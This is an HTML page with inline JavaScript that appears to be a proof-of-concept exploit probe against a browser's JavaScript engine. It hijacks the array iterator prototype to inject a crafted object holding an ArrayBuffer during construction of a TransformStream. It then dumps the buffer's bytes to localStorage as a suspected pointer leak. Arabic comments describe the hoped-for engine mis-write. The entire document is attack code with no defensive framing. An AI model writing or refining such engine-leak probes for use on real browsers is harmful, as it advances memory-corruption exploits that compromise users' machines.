<!DOCTYPE html>
<html>
<body>
<div id="s">Running...</div>
<script>
localStorage.removeItem('leak_result');
localStorage.removeItem('leak_data');

let buf = new ArrayBuffer(8);
let view = new DataView(buf);

try {
    Array.prototype[Symbol.iterator] = function() {
        const a = this;
        let i = 0;
        return {
            next() {
                if (i >= a.length) return { done: true };
                let v = a[i];
                if (a.length === 3 && i >= 1) {
                    localStorage.setItem('leak_result', 'IDX_' + i);
                    // مرر كائناً يحتوي على ArrayBuffer
                    // المحرك قد يكتب مؤشراً فيه بدل الكتابة في عنوان خاطئ
                    v = { 
                        x: 0,
                        buf: buf,
                        view: view,
                        length: 8
                    };
                }
                i++;
                return { value: v, done: false };
            }
        };
    };

    new TransformStream();
    localStorage.setItem('leak_result', 'NO_CRASH');
    
    // اقرأ محتوى buf
    let hex = "";
    for (let j = 0; j < 8; j++) {
        hex += view.getUint8(j).toString(16).padStart(2,'0') + " ";
    }
    localStorage.setItem('leak_data', hex);
    
} catch(e) {
    localStorage.setItem('leak_result', 'CAUGHT: ' + e.message);
    
    // حتى لو تم التقاط الخطأ، اقرأ buf
    let hex = "";
    for (let j = 0; j < 8; j++) {
        hex += view.getUint8(j).toString(16).padStart(2,'0') + " ";
    }
    localStorage.setItem('leak_data', hex);
}

Array.prototype[Symbol.iterator] = [][Symbol.iterator];
document.getElementById("s").textContent = "Done.";
</script>
</body>
</html>
